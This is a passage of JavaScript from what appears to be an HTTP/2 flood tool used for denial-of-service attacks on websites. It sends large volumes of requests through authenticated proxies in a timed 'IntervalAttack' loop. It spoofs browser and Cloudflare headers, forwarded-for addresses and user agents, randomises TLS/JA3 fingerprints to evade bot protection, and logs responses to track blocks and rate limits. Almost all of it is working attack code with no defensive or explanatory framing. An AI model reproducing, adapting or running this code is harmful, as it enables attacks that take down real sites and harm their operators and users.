if (process.argv.includes('--bypass')) {
dunghoitaisao  = bot;
vcl = parsedTarget.path + "?\\//";
} else {
dunghoitaisao = user_agent;
vcl = parsedTarget.path;
}

    let headers = {
        ":authority": parsedTarget.host,
        ":method": methods,
        "x-forwarded-for": parsedProxy[0],
        'priority': `u=${getRandomInt(0,1)}, i`,
        "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
        "accept-encoding": "gzip, br",
        "Accept": accept_header[Math.floor(Math.random() * accept_header.length)],
        ":path": vcl + query,
        ":scheme": "https",
        "sec-ch-ua-platform": secChUaPlatform,
        "sec-ch-ua": brandValue,
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": Math.random() > 0.5 ? "same-origin" : "none",
        "sec-fetch-user": "?1",
        "user-agent": dunghoitaisao,
        "Upgrade-Insecure-Requests": "1",
       "Origin": ori,
        "Referer": ref,
"cookie" : cookies,
...extra,
...headercloudflare,
//...(methods === "POST" && { "sec-ch-ua-arch": sec_ch_ua_arch}),
//...(methods === "POST" && { "sec-ch-ua-bitness": "\"64\""}),
//...(methods === "POST" && { "sec-ch-ua-full-version": fullVersion}),
//...(methods === "POST" && { "sec-ch-ua-full-version-list": versionList}),
//...(methods === "POST" && { "sec-ch-ua-model": "\"\""}),
//...(methods === "POST" && { "sec-ch-ua-platform-version": platformVersion}),
//...(methods === "POST" && { "content-length": randstra(3)}),
//...(methods === "POST" && { "content-type": "application/x-www-form-urlencoded"}),
    }








function random_int(minimum, maximum) {
    return Math.floor(Math.random() * (maximum - minimum + 1)) + minimum;
}
const agent = new http.Agent({
            keepAlive: true,
            maxFreeSockets: Infinity,
            keepAliveMsecs: Infinity,
            maxSockets: Infinity,
            maxTotalSockets: Infinity
        });
    const proxyOptions = {
        agent: agent,
        globalAgent: agent,
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        method: 'CONNECT',
        address: parsedTarget.host + ':443',
        timeout: 100,
        'Proxy-Authorization': `Basic ${Buffer.from(`${parsedProxy[2]}:${parsedProxy[3]}`).toString('base64')}`,
    };
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true)

        const ssl_versions = ['771', '772', '773']; 
const cipher_suites = ['4865', '4866', '4867', '49195', '49195', '49199', '49196', '49200', '52393', '52392', '49171', '49172', '156', '157', '47', '53'];
const extensions = ['45', '35', '18', '0', '5', '17513', '27', '10', '11', '43', '13', '16', '65281', '65037', '51', '23', '41'];
const elliptic_curves = ['4588', '29', '23', '24'];
function random_fingerprint() {
    const version = ssl_versions[random_int(0, ssl_versions.length - 1)];
    const cipher = cipher_suites[random_int(0, cipher_suites.length - 1)];
    const extension = extensions[random_int(0, extensions.length - 1)];
    const curve = elliptic_curves[random_int(0, elliptic_curves.length - 1)];

    const ja3 = `${version},${cipher},${extension},${curve}`;

    return crypto.createHash('md5').update(ja3).digest('hex');
}

let HeadersResponse
if (process.argv.includes('--cache')) {
HeadersResponse = {
    'Cache-Control' : "max-age=0",
    'X-Cache' : Math.random() > 0.5 ? "HIT" : "MISS",
 }; 
} else {
HeadersResponse = {
    'Cache-Control' : "no-store, no-cache, must-revalidate",
 }; 
}
        const tlsOptions = {                
                ALPNProtocols: [
                    "h2","http/1.1"
                ],
            port: parsedPort,
            secure: true,            
            ciphers: ciphers,
                ...(Math.random() < random_int(0, 75) / 100) ? { sigalgs: sigalgs } : {},
            ecdhCurve: Math.random() < 0.75 ? "X25519" : curves,
                minVersion: "TLSv1.3",
               
                requestOCSP: Math.random() < 0.50 ? true : false,
            socket: connection,
            requestCert: true,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            fingerprint: random_fingerprint
        };

        const tlsConn = tls.connect(parsedTarget,tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            settings: getSettingsBasedOnISP(isp),
            createConnection: () => tlsConn,
            socket: connection,
        });
        

        client.setMaxListeners(0);
        client.settings(getSettingsBasedOnISP(isp));
        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                 dynHeaders = {
                        ...headers,
                        ...HeadersResponse,
                   };
                  const request = client.request(dynHeaders)
                        .on("response", response => {
                                                        
let statuses
if (response[":status"] <= 400) {
statuses = "HTTP/2 OK".rainbow;
} else if (response[":status"] === 403) {
statuses = "HTTP/2 Forbidden".green;
} else if (response[":status"] === 429) {
statuses = "HTTP/2 Ratelimit".magenta;
} else if (response[":status"] >= 500) {
statuses = "Timeout".red;
} else {
statuses = "HTTP/2 not found".blue;
}
if (process.argv.includes('--debug')) {
console.log(`[${'WORKER'.bold.magenta}].  |. ${('Proxy').bold.red}: ${(parsedProxy[0]).bold.italic.cyan}.  |. ${('Target').bold.red}:${(args.target).bold.italic.cyan}. |. ${('Status').bold.red}: ${statuses}. |. ${('User-Agent').bold.red}:${(dunghoitaisao).bold.italic.cyan}. |. ${('Path').bold.red}:${(vcl).bold.italic.cyan}`);
}
     //   console.log(dynHeaders)
//   console.log(request)            
                          
                            request.close();
                            request.destroy();
                            return
                        });
                    request.end();		 	
                    

                }
            }, interval);
            return;
        });

        



            

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });
        client.on("timeout", () => {
            client.destroy();
            connection.destroy();
            return
        });
        client.on("error", (error) => {
if (error.code === "ERR_HTTP2_GOAWAY_SESSION" || error.code === "ECONNRESET" || error.code == "ERR_HTTP2_ERROR") {
                    client.close();
}
            client.destroy();
            connection.destroy();
            return
        });
    });
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
const client = http2.connect(parsed.href, clientOptions, function() {});